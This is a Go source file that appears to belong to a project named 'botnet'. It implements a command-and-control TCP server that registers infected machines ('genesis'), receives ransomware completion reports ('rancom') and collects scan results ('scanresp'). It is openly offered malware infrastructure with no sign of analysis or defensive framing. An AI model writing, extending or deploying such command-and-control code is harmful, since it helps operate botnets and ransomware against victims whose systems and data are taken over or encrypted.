package tcp

import (
	"bytes"
	"io"
	"net"

	"github.com/rodzzlessa24/botnet"
)

//CommanderService is
type CommanderService struct {
	CC      *botnet.CommandControl
	Storage botnet.Storager
}

//NewCC is
func NewCC(host, port string, storage botnet.Storager) *CommanderService {
	return &CommanderService{
		CC: &botnet.CommandControl{
			Port: port,
			Host: host,
		},
		Storage: storage,
	}
}

//Listen is
func (c *CommanderService) Listen() {
	listener, err := net.Listen("tcp", c.CC.Addr())
	if err != nil {
		botnet.Err(err, "listening on addr", c.CC.Addr())
		return
	}
	botnet.Msg("botnet listening on", c.CC.Addr())

	c.acceptConnections(listener)
}

func (c *CommanderService) acceptConnections(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			botnet.Err(err, "accepting connection")
			continue
		}
		go c.handleConnection(conn)
	}
}

func (c *CommanderService) handleConnection(conn net.Conn) {
	req := new(bytes.Buffer)
	if _, err := io.Copy(req, conn); err != nil {
		botnet.Err(err)
		return
	}
	command := bytesToCommand(req.Bytes()[:commandLength])

	switch command {
	case "genesis":
		c.HandleGenesis(req.Bytes()[commandLength:])
	case "rancom":
		c.HandleRansomComplete(req.Bytes()[commandLength:])
	case "scanresp":
		c.HandleScanResponse(req.Bytes()[commandLength:])
	}
	conn.Close()
}
